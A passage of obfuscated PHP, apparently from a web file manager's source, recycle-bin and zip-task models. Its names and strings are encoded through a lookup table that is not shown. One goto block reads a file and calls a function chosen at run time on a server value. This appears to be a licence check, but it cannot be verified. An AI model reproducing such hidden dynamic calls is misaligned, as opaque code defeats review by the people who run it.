$Çé«ÉËÚ; } $÷¯¼–İ = $this->sourceInfo($õĞœØÒá); if (!$÷¯¼–İ) { return !1; } $÷¯¼–İ = $this->_listDataApplyItem($÷¯¼–İ, $…ŸÏ÷); self::$cachePathInfo[$ËáïÑêÚ] = $÷¯¼–İ; return $÷¯¼–İ; } public static $cachePathInfoMore = array(); public function pathInfoMore($”¹íãİ) { $¬—µ­ä† =& $_SERVER[Îûáû“ş]; $ƒ¬¾³Ü³ = _get(self::$cachePathInfoMore, $”¹íãİ); if ($ƒ¬¾³Ü³) { return $ƒ¬¾³Ü³; } $»¶ú®¿ = $this->pathInfo($”¹íãİ); if (!$»¶ú®¿) { return !1; } if ($»¶ú®¿[$¬—µ­ä†[410]] == $¬—µ­ä†[88]) { $»¶ú®¿[$¬—µ­ä†[79]] = $this->folderChildrenNumber($”¹íãİ); } self::$cachePathInfoMore[$”¹íãİ] = $»¶ú®¿; return $»¶ú®¿; } public function sourceInfo($ñ¡“Ş•) { $¥í¥úÉ€ =& $_SERVER[Îûáû“ş]; if (!$ñ¡“Ş•) { return array(); } $ñ¡“Ş• = intval($ñ¡“Ş•); $ùœ³°æ = $¥í¥úÉ€[460] . $ñ¡“Ş•; $¾ÙĞ¸³¯ = _get(self::$cacheSourceInfo, $ùœ³°æ); if ($¾ÙĞ¸³¯) { return $¾ÙĞ¸³¯; } $ŠçÍÓ¥è = $this->where(array($¥í¥úÉ€[402] => $ñ¡“Ş•))->find(); self::$cacheSourceInfo[$ùœ³°æ] = $ŠçÍÓ¥è; return self::$cacheSourceInfo[$ùœ³°æ]; } public function sourceCacheClear($¾®§ÛŞ = false) { self::cacheClear($¾®§ÛŞ); } public static function cacheClear($ê¡¯ü‡— = false) { $÷ÙŞ…²Ù =& $_SERVER[Îûáû“ş]; if ($ê¡¯ü‡— == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$÷ÙŞ…²Ù[460] . $ê¡¯ü‡—]); unset(self::$cachePathInfoMore[$ê¡¯ü‡—]); unset(self::$cachePathInfo[$÷ÙŞ…²Ù[2163] . $ê¡¯ü‡—]); unset(self::$cachePathInfo[$÷ÙŞ…²Ù[2164] . $ê¡¯ü‡—]); } public function metaSet($Úœš¹´Ç, $ÀíğÎï‰ = null, $Ó–“€Õ’ = null) { $µ·‹÷¢÷ = parent::metaSet($Úœš¹´Ç, $ÀíğÎï‰, $Ó–“€Õ’); if ($µ·‹÷¢÷) { $this->sourceCacheClear($Úœš¹´Ç); } return $µ·‹÷¢÷; } public function pathInfoByPath($‘¤şî¤ğ, $°·Èï¶„) { $ÌÁ½¸ä =& $_SERVER[Îûáû“ş]; $©¸àüı¢ = !$°·Èï¶„ ? array() : explode($ÌÁ½¸ä[8], trim($°·Èï¶„, $ÌÁ½¸ä[8])); $§æŠ¡ü = $‘¤şî¤ğ; foreach ($©¸àüı¢ as $ ‰õ©åÈ) { $ª¨§ìØª = array($ÌÁ½¸ä[432] => $§æŠ¡ü, $ÌÁ½¸ä[32] => $ ‰õ©åÈ); $¼™¯©‘¿ = $this->where($ª¨§ìØª)->select(); if (!$¼™¯©‘¿) { return !1; } $¼™¯©‘¿ = array_sort_by($¼™¯©‘¿, $ÌÁ½¸ä[431]); $§æŠ¡ü = $¼™¯©‘¿[0][$ÌÁ½¸ä[402]]; } return $this->pathInfo($§æŠ¡ü, !0); } protected function updateModifyTime($Ï¥û¿®²) { $Øàœı—’ =& $_SERVER[Îûáû“ş]; if (!$Ï¥û¿®²) { return; } if (!is_array($Ï¥û¿®²)) { $Ï¥û¿®² = array($Ï¥û¿®²); } foreach ($Ï¥û¿®² as $´è£©Š => $Ö®·ªì®) { $Ï¥û¿®²[$´è£©Š] = intval($Ö®·ªì®); $this->sourceCacheClear($Ö®·ªì®); } $»ìüŸÖà = array($Øàœı—’[402] => array($Øàœı—’[7], $Ï¥û¿®²)); $çƒÛçæ = array($Øàœı—’[579] => USER_ID, $Øàœı—’[424] => time()); $this->where($»ìüŸÖà)->save($çƒÛçæ); } public function folderSizeReset($øñ¨–€, $“”ÉÈ”¹ = false) { $Ş¼­÷â„ =& $_SERVER[Îûáû“ş]; if ($this->statusIgnoreResetSpace) { return; } $«„ÆÖ¡‡ = $this->sourceInfo($øñ¨–€); $‡¶ıÃˆ = $Ş¼­÷â„[2165] . $øñ¨–€; CacheLock::lock($‡¶ıÃˆ, 20); if ($“”ÉÈ”¹ === !1) { $this->sourceCacheClear($øñ¨–€); $«„ÆÖ¡‡ = $this->sourceInfo($øñ¨–€); $íÈƒÛ¼ = array($Ş¼­÷â„[401] => $øñ¨–€, $Ş¼­÷â„[430] => 0); $³ìË´‚ñ = $this->where($íÈƒÛ¼)->sum($Ş¼­÷â„[76]); $“”ÉÈ”¹ = intval($³ìË´‚ñ) - intval($«„ÆÖ¡‡[$Ş¼­÷â„[76]]); } if ($“”ÉÈ”¹ == 0) { return CacheLock::unlock($‡¶ıÃˆ); } $“¾–İöÕ = $this->parentLevelArray($«„ÆÖ¡‡[$Ş¼­÷â„[511]]); if (!$“¾–İöÕ) { $“¾–İöÕ = array(); } $“¾–İöÕ[] = $«„ÆÖ¡‡[$Ş¼­÷â„[402]]; $íÈƒÛ¼ = array($Ş¼­÷â„[402] => array($Ş¼­÷â„[418], $“¾–İöÕ)); if ($“”ÉÈ”¹ < 0) { $íÈƒÛ¼[$Ş¼­÷â„[76]] = array($Ş¼­÷â„[1017], abs($“”ÉÈ”¹)); } $this->where($íÈƒÛ¼)->setAdd($Ş¼­÷â„[76], $“”ÉÈ”¹); CacheLock::unlock($‡¶ıÃˆ); $¶¼îŒ¦ = $Ş¼­÷â„[2166] . $«„ÆÖ¡‡[$Ş¼­÷â„[411]] . $Ş¼­÷â„[4] . $«„ÆÖ¡‡[$Ş¼­÷â„[496]]; $ç½š£ïƒ = array($«„ÆÖ¡‡[$Ş¼­÷â„[411]], $«„ÆÖ¡‡[$Ş¼­÷â„[496]]); TaskRun::timeLimitCall($¶¼îŒ¦, $Ş¼­÷â„[2167], $ç½š£ïƒ, 1.5); } public function folderSizeResetChildren($šÇ–ıÓê) { $ÌÏ½“«´ =& $_SERVER[Îûáû“ş]; $this->sourceCacheClear($šÇ–ıÓê); $Ü´„‡˜¦ = $this->sourceInfo($šÇ–ıÓê); $ß©¿Ş¶„ = array($ÌÏ½“«´[574] => 1, $ÌÏ½“«´[577] => $Ü´„‡˜¦[$ÌÏ½“«´[496]], $ÌÏ½“«´[580] => array($ÌÏ½“«´[540], $Ü´„‡˜¦[$ÌÏ½“«´[511]] . $šÇ–ıÓê . $ÌÏ½“«´[541])); $ûŒ¼’ê = $ÌÏ½“«´[2168]; $Ş¬åû„¿ = $this->field($ûŒ¼’ê)->where($ß©¿Ş¶„)->select(); $ß©¿Ş¶„[$ÌÏ½“«´[410]] = 0; $İ…‡æ¹Ì = $this->field($ûŒ¼’ê)->where($ß©¿Ş¶„)->select(); if (!$İ…‡æ¹Ì) { return; } $Ş¬åû„¿[] = $Ü´„‡˜¦; $Ş¬åû„¿ = array_to_keyvalue($Ş¬åû„¿, $ÌÏ½“«´[402]); foreach ($Ş¬åû„¿ as $íğƒƒÃ => $™£ÈÇĞ) { $Ş¬åû„¿[$íğƒƒÃ][$ÌÏ½“«´[2169]] = $Ş¬åû„¿[$íğƒƒÃ][$ÌÏ½“«´[76]]; $Ş¬åû„¿[$íğƒƒÃ][$ÌÏ½“«´[76]] = 0; } foreach ($İ…‡æ¹Ì as $™£ÈÇĞ) { $šÎšµæ– = $™£ÈÇĞ[$ÌÏ½“«´[432]] . $ÌÏ½“«´[12]; if (!isset($Ş¬åû„¿[$šÎšµæ–])) { continue; } if ($™£ÈÇĞ[$ÌÏ½“«´[431]] == $Ş¬åû„¿[$šÎšµæ–][$ÌÏ½“«´[431]]) { $Ş¬åû„¿[$šÎšµæ–][$ÌÏ½“«´[76]] += $™£ÈÇĞ[$ÌÏ½“«´[76]]; } } foreach ($Ş¬åû„¿ as $™£ÈÇĞ) { $¤»ø“ô‰ = $this->parentLevelArray($™£ÈÇĞ[$ÌÏ½“«´[511]]); foreach ($¤»ø“ô‰ as $šÎšµæ–) { $šÎšµæ– = $šÎšµæ– . $ÌÏ½“«´[12]; if (!isset($Ş¬åû„¿[$šÎšµæ–])) { continue; } if ($™£ÈÇĞ[$ÌÏ½“«´[431]] == $Ş¬åû„¿[$šÎšµæ–][$ÌÏ½“«´[431]]) { $Ş¬åû„¿[$šÎšµæ–][$ÌÏ½“«´[76]] += $™£ÈÇĞ[$ÌÏ½“«´[76]]; } } } $âî·Œ·ë = array(); foreach ($Ş¬åû„¿ as $™£ÈÇĞ) { if ($™£ÈÇĞ[$ÌÏ½“«´[76]] == $™£ÈÇĞ[$ÌÏ½“«´[2169]]) { continue; } $âî·Œ·ë[] = array($ÌÏ½“«´[402], $™£ÈÇĞ[$ÌÏ½“«´[402]], $ÌÏ½“«´[76], $™£ÈÇĞ[$ÌÏ½“«´[76]]); } $this->saveAll($âî·Œ·ë); } public function userSpaceReset($ã™¯ÀÍğ = false) { $óÖîÁöé =& $_SERVER[Îûáû“ş]; $°ú¡éÃı = $this->where(array($óÖîÁöé[411] => self::TYPE_USER, $óÖîÁöé[496] => $ã™¯ÀÍğ, $óÖîÁöé[410] => 0))->sum($óÖîÁöé[76]); $°ú¡éÃı = !$°ú¡éÃı || $°ú¡éÃı <= 0 ? 0 : $°ú¡éÃı; Model($óÖîÁöé[504])->userEdit($ã™¯ÀÍğ, array($óÖîÁöé[1850] => $°ú¡éÃı)); } public function targetSpaceUpdate($Õ§¿µøÉ, $Úç²Òƒæ) { $â‹ïÇæÃ =& $_SERVER[Îûáû“ş]; if (!$Úç²Òƒæ) { return; } if (!in_array($Õ§¿µøÉ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ëè¿æÜØ = $this->targetSpaceSize($Õ§¿µøÉ, $Úç²Òƒæ); if ($Õ§¿µøÉ == self::TYPE_USER) { Model($â‹ïÇæÃ[504])->userEdit($Úç²Òƒæ, array($â‹ïÇæÃ[1850] => $ëè¿æÜØ)); } else { if ($Õ§¿µøÉ == self::TYPE_GROUP) { Model($â‹ïÇæÃ[512])->groupEdit($Úç²Òƒæ, array($â‹ïÇæÃ[1850] => $ëè¿æÜØ)); } } } public function targetSpaceSize($ËºĞÖ‚, $Òè¥Ø¼Ş) { $ÅÕ³¶•ı =& $_SERVER[Îûáû“ş]; $çàÕ§¸ = 0; $úÅùä¯ = $this->targetSourceRoot($ËºĞÖ‚, $Òè¥Ø¼Ş, !0); foreach ($úÅùä¯ as $÷Øá§°è) { if (!$÷Øá§°è) { continue; } $çàÕ§¸ += floatval($÷Øá§°è[$ÅÕ³¶•ı[76]]); $Åè·ö»ƒ = array($ÅÕ³¶•ı[580] => array($ÅÕ³¶•ı[540], $ÅÕ³¶•ı[521] . $÷Øá§°è[$ÅÕ³¶•ı[402]] . $ÅÕ³¶•ı[541])); $ì·İ¢ = Model($ÅÕ³¶•ı[429])->field($ÅÕ³¶•ı[417])->where($Åè·ö»ƒ)->select(); $ì·İ¢ = array_to_keyvalue($ì·İ¢, $ÅÕ³¶•ı[12], $ÅÕ³¶•ı[402]); $ì·İ¢ = array_unique(array_filter($ì·İ¢)); if ($ì·İ¢) { $Åè·ö»ƒ = array($ÅÕ³¶•ı[417] => array($ÅÕ³¶•ı[418], $ì·İ¢)); $çàÕ§¸ += floatval($this->where($Åè·ö»ƒ)->sum($ÅÕ³¶•ı[76])); } } $çàÕ§¸ = !$çàÕ§¸ || $çàÕ§¸ <= 0 ? 0 : $çàÕ§¸; return $çàÕ§¸; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¢ÓË“³) { return $this->fileTypeProfile($¢ÓË“³, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ÑœŒ‡µ’) { return $this->fileTypeProfile($ÑœŒ‡µ’, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Øö£Ğ ‰, $‰¯Æ³‰Ñ) { $Ğïè«¹ì =& $_SERVER[Îûáû“ş]; $éÇàâœ¾ = $Ğïè«¹ì[2170] . $Øö£Ğ ‰ . $Ğïè«¹ì[11] . $‰¯Æ³‰Ñ; $êĞ‰ƒúü = Cache::get($éÇàâœ¾); if ($êĞ‰ƒúü) { return $êĞ‰ƒúü; } $ôæïÒÁ¥ = array($Ğïè«¹ì[574] => 0); if ($Øö£Ğ ‰ != !1) { $ôæïÒÁ¥[$Ğïè«¹ì[496]] = $Øö£Ğ ‰; $ôæïÒÁ¥[$Ğïè«¹ì[411]] = $‰¯Æ³‰Ñ; } $Ÿ€·ù´™ = array(); $Ÿ€·ù´™[$Ğïè«¹ì[2171]] = array($Ğïè«¹ì[2172] => LNG($Ğïè«¹ì[2171]), $Ğïè«¹ì[2173] => $this->where($ôæïÒÁ¥)->count(), $Ğïè«¹ì[545] => $this->where($ôæïÒÁ¥)->sum($Ğïè«¹ì[76])); $åâÕû„ = KodIO::fileTypeList(); foreach ($åâÕû„ as $–»½™‘Ó => $†Ç°£¢¬) { $ôæïÒÁ¥[$Ğïè«¹ì[412]] = $this->fileTypeWhere($–»½™‘Ó); $Ÿ€·ù´™[$–»½™‘Ó] = array($Ğïè«¹ì[2172] => $†Ç°£¢¬[$Ğïè«¹ì[32]], $Ğïè«¹ì[2173] => $this->where($ôæïÒÁ¥)->count(), $Ğïè«¹ì[545] => $this->where($ôæïÒÁ¥)->sum($Ğïè«¹ì[76])); } Cache::set($éÇàâœ¾, $Ÿ€·ù´™, 1200); return $Ÿ€·ù´™; } public function fileNameExist($‰˜æ¿–±, $²¸®ç•Ğ) { $í”­˜ğ =& $_SERVER[Îûáû“ş]; $’±§˜…à = $this->where(array($í”­˜ğ[432] => $‰˜æ¿–±, $í”­˜ğ[32] => $²¸®ç•Ğ, $í”­˜ğ[431] => 0))->find(); return is_array($’±§˜…à) ? $’±§˜…à[$í”­˜ğ[402]] : !1; } public function childList($­Éæƒ¢) { $ÔÈˆûİÅ =& $_SERVER[Îûáû“ş]; $¦¬•à¸ = $ÔÈˆûİÅ[2148] . $­Éæƒ¢; if (isset(self::$cacheChildList[$¦¬•à¸])) { return self::$cacheChildList[$¦¬•à¸]; } $›Ğš–óò = array($ÔÈˆûİÅ[432] => intval($­Éæƒ¢), $ÔÈˆûİÅ[431] => 0); $˜È†×› = $this->where($›Ğš–óò)->select(); $˜È†×› = $˜È†×› ? $˜È†×› : array(); self::$cacheChildList[$¦¬•à¸] = $˜È†×›; foreach ($˜È†×› as $’îÇä Í) { $¦¬•à¸ = $ÔÈˆûİÅ[460] . $’îÇä Í[$ÔÈˆûİÅ[402]]; self::$cacheSourceInfo[$¦¬•à¸] = $’îÇä Í; } return $˜È†×›; } public function fileNameAuto($àŠ«š, $ñã¯äØö, $Ñõ¬Ì§º = REPEAT_RENAME, $ºõ³Ö¬¢ = false) { $¿»À½˜‹ =& $_SERVER[Îûáû“ş]; $ø«À¥´¯ = get_path_ext($ñã¯äØö); $¨¬Ö×ÎÇ = $ø«À¥´¯ ? basename($ñã¯äØö, $¿»À½˜‹[10] . $ø«À¥´¯) . $¿»À½˜‹[2174] . $ø«À¥´¯ : $ñã¯äØö . $¿»À½˜‹[384]; $åÛ¬ëÖ³ = array($¿»À½˜‹[432] => $àŠ«š, $¿»À½˜‹[431] => 0, $¿»À½˜‹[32] => array($¿»À½˜‹[383], $¨¬Ö×ÎÇ)); $ÛéòÅ÷ = $this->field($¿»À½˜‹[32])->where($åÛ¬ëÖ³)->select(); $’ ²çîä = array_to_keyvalue($ÛéòÅ÷, $¿»À½˜‹[12], $¿»À½˜‹[32]); return $this->fileNameAutoGet($’ ²çîä, $ñã¯äØö, $Ñõ¬Ì§º, $ºõ³Ö¬¢); } public function fileNameAutoGet($‡ÍÑÜ, $ÖÕÛ“Ü², $îéĞˆŸ, $íÄ£—) { $ÇÒ”ƒˆØ =& $_SERVER[Îûáû“ş]; if ($îéĞˆŸ == REPEAT_REPLACE || !$‡ÍÑÜ || !in_array_not_case($ÖÕÛ“Ü², $‡ÍÑÜ) || $íÄ£— && $îéĞˆŸ != REPEAT_RENAME_FOLDER) { return $ÖÕÛ“Ü²; } if ($îéĞˆŸ == REPEAT_SKIP) { return !1; } $¦Ò´ÃîÒ = $ÇÒ”ƒˆØ[10] . get_path_ext($ÖÕÛ“Ü²); $¦Ò´ÃîÒ = $¦Ò´ÃîÒ == $ÇÒ”ƒˆØ[10] || $íÄ£— ? $ÇÒ”ƒˆØ[12] : $¦Ò´ÃîÒ; for ($ìø’Ì± = 1; $ìø’Ì± <= count($‡ÍÑÜ) + 1; $ìø’Ì±++) { $íÔÀÛõü = substr($ÖÕÛ“Ü², 0, strlen($ÖÕÛ“Ü²) - strlen($¦Ò´ÃîÒ)); $µí¥·ø‘ = $íÔÀÛõü . "\50{$ìø’Ì±}\x29{$¦Ò´ÃîÒ}"; if (!in_array_not_case($µí¥·ø‘, $‡ÍÑÜ)) { return $µí¥·ø‘; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\143\x65\x5f\x72\145\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\151\155\x65", "\x74\151\x6d\x65", "\x69\x6e\163\145\x72\164", "\x66\x75\x6e\143\164\151\x6f\156")); public function listData($íÈÑ„Ğ = false) { $œÛ©ÖÜ³ =& $_SERVER[Îûáû“ş]; $íÈÑ„Ğ = $íÈÑ„Ğ ? $íÈÑ„Ğ : USER_ID; $«ñÏÎº— = $this->where(array($œÛ©ÖÜ³[1661] => $íÈÑ„Ğ))->select(); return array_to_keyvalue($«ñÏÎº—, $œÛ©ÖÜ³[12], $œÛ©ÖÜ³[402]); } public function moveToRecycle($éî¯â¥ ) { $îõ˜§š =& $_SERVER[Îûáû“ş]; $Õ´õšË“ = Model($îõ˜§š[1341]); $â“¥ô½± = $Õ´õšË“->sourceInfo($éî¯â¥ ); if (!$â“¥ô½± || $â“¥ô½±[$îõ˜§š[431]] == $îõ˜§š[88]) { return; } $‰ùÒ±¹í = array($îõ˜§š[417] => $éî¯â¥ , $îõ˜§š[1661] => USER_ID, $îõ˜§š[576] => $â“¥ô½±[$îõ˜§š[411]], $îõ˜§š[577] => $â“¥ô½±[$îõ˜§š[496]], $îõ˜§š[580] => $â“¥ô½±[$îõ˜§š[511]]); $this->add($‰ùÒ±¹í); $this->recycleMove($éî¯â¥ , 1); if ($â“¥ô½±[$îõ˜§š[410]] == $îõ˜§š[88]) { $Íæ©Š‰Ü = array($îõ˜§š[580] => array($îõ˜§š[540], $â“¥ô½±[$îõ˜§š[511]] . $éî¯â¥  . $îõ˜§š[541])); $Õ´õšË“->where($Íæ©Š‰Ü)->setField($îõ˜§š[431], 1); } } public function clear() { $this->remove(!1); } public function remove($ö¦Õ©º = false, $´å”ùíÌ = false) { $«¤ë’öË =& $_SERVER[Îûáû“ş]; $´å”ùíÌ = $´å”ùíÌ ? $´å”ùíÌ : USER_ID; $ÛÀÄ¶¾ = Model($«¤ë’öË[1341]); $éÉÌ¨¨ = $this->listData($´å”ùíÌ); $ö¦Õ©º = $ö¦Õ©º === !1 ? !1 : $ö¦Õ©º; $¹ñƒô = array(); foreach ($éÉÌ¨¨ as $¢™Îà•°) { if ($ö¦Õ©º != !1 && !in_array($¢™Îà•°, $ö¦Õ©º)) { continue; } $µò« = $ÛÀÄ¶¾->sourceInfo($¢™Îà•°); $ÛÀÄ¶¾->remove($¢™Îà•°, !1); $„“ä ‡ = $µò«[$«¤ë’öË[411]] . $«¤ë’öË[11] . $µò«[$«¤ë’öË[496]]; $¹ñƒô[$„“ä ‡] = array($«¤ë’öË[576] => $µò«[$«¤ë’öË[411]], $«¤ë’öË[496] => $µò«[$«¤ë’öË[496]]); $this->where(array($«¤ë’öË[402] => $¢™Îà•°))->delete(); } foreach ($¹ñƒô as $‚ÔíÇæ) { $ÛÀÄ¶¾->targetSpaceUpdate($‚ÔíÇæ[$«¤ë’öË[411]], $‚ÔíÇæ[$«¤ë’öË[496]]); } } public function restore($…Å„¦±Î = false) { $÷…œ¼º¿ = $this->listData(); $this->_restoreSource($÷…œ¼º¿, $…Å„¦±Î); } public function removeUserAll($¹â™Ô•î) { $this->remove(!1, $¹â™Ô•î); } private function _restoreSource($°´Ï„ µ, $Â®ñ¾³â) { $£‡ıû—† =& $_SERVER[Îûáû“ş]; $ïÍ×¦³– = Model($£‡ıû—†[1341]); $Â®ñ¾³â = $Â®ñ¾³â == !1 ? !1 : $Â®ñ¾³â; if (!$°´Ï„ µ) { return !0; } $Ïºê‘÷Ï = array(); foreach ($°´Ï„ µ as $—‰•òÃ) { if ($Â®ñ¾³â != !1 && !in_array($—‰•òÃ, $Â®ñ¾³â)) { continue; } $ñĞ…ŒøÉ = $ïÍ×¦³–->sourceInfo($—‰•òÃ); $Àæ©õ–§ = $ïÍ×¦³–->sourceInfo($ñĞ…ŒøÉ[$£‡ıû—†[432]]); if ($Àæ©õ–§[$£‡ıû—†[431]] == $£‡ıû—†[88]) { continue; } $ïÍ×¦³–->lockMoveStart($—‰•òÃ); $this->recycleMove($—‰•òÃ, 0); if ($ñĞ…ŒøÉ[$£‡ıû—†[410]] == $£‡ıû—†[88]) { $‹ØÀ¸·ö = array($£‡ıû—†[580] => array($£‡ıû—†[540], $ñĞ…ŒøÉ[$£‡ıû—†[511]] . $—‰•òÃ . $£‡ıû—†[541])); $ïÍ×¦³–->where($‹ØÀ¸·ö)->setField($£‡ıû—†[431], 0); $this->restoreFolderChildren($—‰•òÃ, $°´Ï„ µ); } $this->where(array($£‡ıû—†[402] => $—‰•òÃ))->delete(); $ïÍ×¦³–->folderSizeReset($ñĞ…ŒøÉ[$£‡ıû—†[432]]); $Ïºê‘÷Ï[] = $ñĞ…ŒøÉ[$£‡ıû—†[432]]; if ($ñĞ…ŒøÉ[$£‡ıû—†[410]] == $£‡ıû—†[88]) { $Ïºê‘÷Ï[] = $—‰•òÃ; } $ïÍ×¦³–->lockMoveEnd($—‰•òÃ); } $ïÍ×¦³–->updateModifyTime($Ïºê‘÷Ï); } private function restoreFolderChildren($¤Ğ½„, $¢ÏğÑãä) { $¼Ù±ğ´© =& $_SERVER[Îûáû“ş]; $öú¼›Ğ„ = Model($¼Ù±ğ´©[1341]); $²–æç‰× = array($¼Ù±ğ´©[402] => array($¼Ù±ğ´©[7], array())); foreach ($¢ÏğÑãä as $ò¡Äì—ä) { if ($ò¡Äì—ä == $¤Ğ½„) { continue; } if (!$öú¼›Ğ„->isParentOf($¤Ğ½„, $ò¡Äì—ä)) { continue; } $Ë‹®¤‹ï = $öú¼›Ğ„->sourceInfo($ò¡Äì—ä); if ($Ë‹®¤‹ï[$¼Ù±ğ´©[410]] == $¼Ù±ğ´©[88]) { $²–æç‰×[] = array($¼Ù±ğ´©[580] => array($¼Ù±ğ´©[540], $Ë‹®¤‹ï[$¼Ù±ğ´©[511]] . $ò¡Äì—ä . $¼Ù±ğ´©[541])); } else { $²–æç‰×[$¼Ù±ğ´©[402]][1][] = $ò¡Äì—ä; } } if (!$²–æç‰×[$¼Ù±ğ´©[402]][1]) { unset($²–æç‰×[$¼Ù±ğ´©[402]]); } if (!$²–æç‰×) { return; } $²–æç‰×[$¼Ù±ğ´©[402]][1] = array_unique($²–æç‰×[$¼Ù±ğ´©[402]][1]); $²–æç‰×[$¼Ù±ğ´©[1002]] = $¼Ù±ğ´©[1959]; $öú¼›Ğ„->where($²–æç‰×)->setField($¼Ù±ğ´©[431], 1); } private function recycleMove($Ìâ¨Œ°Â, $¼Ş¼Èñí = 1) { $¾å³èÎü =& $_SERVER[Îûáû“ş]; $ËĞŸÔî× = Model($¾å³èÎü[1341]); $ğ‘¸¶Õ² = Model($¾å³èÎü[2175]); $¤°‹¸“ = array($¾å³èÎü[402] => $Ìâ¨Œ°Â); if ($¼Ş¼Èñí) { $ËĞŸÔî×->where($¤°‹¸“)->setField($¾å³èÎü[431], 1); $ğ‘¸¶Õ²->eventRecycle($Ìâ¨Œ°Â, $¾å³èÎü[2176]); } else { $˜ôÉÕğ¦ = $ËĞŸÔî×->where($¤°‹¸“)->find(); $¼»ñ¦¼Œ = $˜ôÉÕğ¦[$¾å³èÎü[410]] == $¾å³èÎü[88]; $¨Ü…ÎøÖ = $ËĞŸÔî×->fileNameAuto($˜ôÉÕğ¦[$¾å³èÎü[432]], $˜ôÉÕğ¦[$¾å³èÎü[32]], REPEAT_RENAME_FOLDER, $¼»ñ¦¼Œ); if ($¨Ü…ÎøÖ != $˜ôÉÕğ¦[$¾å³èÎü[32]]) { $ËĞŸÔî×->rename($Ìâ¨Œ°Â, $¨Ü…ÎøÖ); } $ËĞŸÔî×->where($¤°‹¸“)->setField($¾å³èÎü[431], 0); $ğ‘¸¶Õ²->eventRecycle($Ìâ¨Œ°Â, $¾å³èÎü[2177]); } } } goto fÔô½º„; E­‚¾³å¤Ï: if ($_SERVER[$_SERVER[Îûáû“ş][875]] != $_SERVER[$_SERVER[Îûáû“ş][1786]]) { $_getc = $_SERVER[Îûáû“ş][878]; $_getfile = $_SERVER[$_SERVER[Îûáû“ş][879]] . $_SERVER[Îûáû“ş][880]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Îûáû“ş][231], $_getfilec); if (count($_getarrs) < $_SERVER[Îûáû“ş][635]) { $exit = $_SERVER[Îûáû“ş][881]; $exit(); } $_act = $_SERVER[Îûáû“ş][1787]; $_act($_SERVER[$_SERVER[Îûáû“ş][876]]); } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÆÈÊ¢ó =& $_SERVER[Îûáû“ş]; parent::startAfter(); Hook::bind($ÆÈÊ¢ó[1788], array($this, $ÆÈÊ¢ó[1781])); $æÓÁ‡“Ğ =& $this->task; $æÓÁ‡“Ğ[$ÆÈÊ¢ó[1783]] = $ÆÈÊ¢ó[1196]; if (!$æÓÁ‡“Ğ[$ÆÈÊ¢ó[1570]]) { $æÓÁ‡“Ğ[$ÆÈÊ¢ó[1570]] = LNG($ÆÈÊ¢ó[1789]); } } protected function endAfter() { $İ€“€³ =& $_SERVER[Îûáû“ş]; parent::endAfter(); Hook::unbind($İ€“€³[1788], array($this, $İ€“€³[1781])); } public function updateAfter() { $­ê×’çì =& $_SERVER[Îûáû“ş]; $îØ®“êì =& $this->task; if (!$îØ®“êì[$­ê×’çì[785]] || !$îØ®“êì[$­ê×’çì[762]]) { return; } if ($îØ®“êì[$­ê×’çì[1783]] == $­ê×’çì[1196]) { $¨³¬İçú = $îØ®“êì[$­ê×’çì[1724]]; if ($îØ®“êì[$­ê×’çì[1725]] != $­ê×’çì[1196]) { $¨³¬İçú = 0; } $÷•ˆŠñ† = ($îØ®“êì[$­ê×’çì[1728]] + $¨³¬İçú) / $îØ®“êì[$­ê×’çì[762]]; $îØ®“êì[$­ê×’çì[1672]] = $÷•ˆŠñ† * 0.3; } else { if ($îØ®“êì[$­ê×’çì[1783]] == $­ê×’çì[313]) { $÷•ˆŠñ† = $îØ®“êì[$­ê×’çì[1671]] / $îØ®“êì[$­ê×’çì[785]]; $îØ®“êì[$­ê×’çì[1672]] = 0.3 + $÷•ˆŠñ† * 0.5; } else { if ($îØ®“êì[$­ê×’çì[1783]] == $­ê×’çì[107]) { $÷•ˆŠñ† = 0; if ($îØ®“êì[$­ê×’çì[1723]]) { $÷•ˆŠñ† = $îØ®“êì[$­ê×’çì[1724]] / $îØ®“êì[$­ê×’çì[1723]]; } $îØ®“êì[$­ê×’çì[1672]] = 0.3 + 0.5 + $÷•ˆŠñ† * 0.2; } } } if ($îØ®“êì[$­ê×’çì[1672]] > 0) { $µøĞ¶ğÂ = timeFloat() - $îØ®“êì[$­ê×’çì[1674]] - $îØ®“êì[$­ê×’çì[1677]]; $îØ®“êì[$­ê×’çì[1678]] = $µøĞ¶ğÂ * (1 - $îØ®“êì[$­ê×’çì[1672]]) / $îØ®“êì[$­ê×’çì[1672]]; } } public function copyFileStart($õí˜†ƒš, $ËŸ¼â„¤, $ºü ¦ô, $×ËòøĞ´, $²¼’ò³Ù, $íŒ²”ëı) { $¶ò¤í¹ =& $_SERVER[Îûáû“ş]; parent::copyFileStart($õí˜†ƒš, $ËŸ¼â„¤, $ºü ¦ô, $×ËòøĞ´, $²¼’ò³Ù, $íŒ²”ëı); $´‰—õ‹Ü =& $this->task; if ($´‰—õ‹Ü[$¶ò¤í¹[1783]] == $¶ò¤í¹[313]) { $´‰—õ‹Ü[$¶ò¤í¹[1783]] = $¶ò¤í¹[107]; } $this->update(); } public function copyFileEnd($ß€ğª‘¤, $ÃÚ¢¾ÛË, $ëõä´£ç, $à¯øÕ¢§, $Ïã§³©, $¢‚šæËŸ) { $ñ‘›²˜× =& $_SERVER[Îûáû“ş]; $Ÿ¿‹óÊË =& $this->task; $Ÿ¿‹óÊË[$ñ‘›²˜×[1724]] = $Ÿ¿‹óÊË[$ñ‘›²˜×[1723]]; $Ÿ¿‹óÊË[$ñ‘›²˜×[1728]] += $Ÿ¿‹óÊË[$ñ‘›²˜×[1723]]; $Ÿ¿‹óÊË[$ñ‘›²˜×[1725]] = $ñ‘›²˜×[12]; $this->update(); } public function nameParse($“Ë»ñÖ) { $ËÊ–ø¹© =& $_SERVER[Îûáû“ş]; $§Åõ­¯¸ =& $this->task; if ($§Åõ­¯¸[$ËÊ–ø¹©[1671]] < $§Åõ­¯¸[$ËÊ–ø¹©[785]]) { $æ¶´»š¸ = get_path_this($“Ë»ñÖ); if (strstr($æ¶´»š¸, 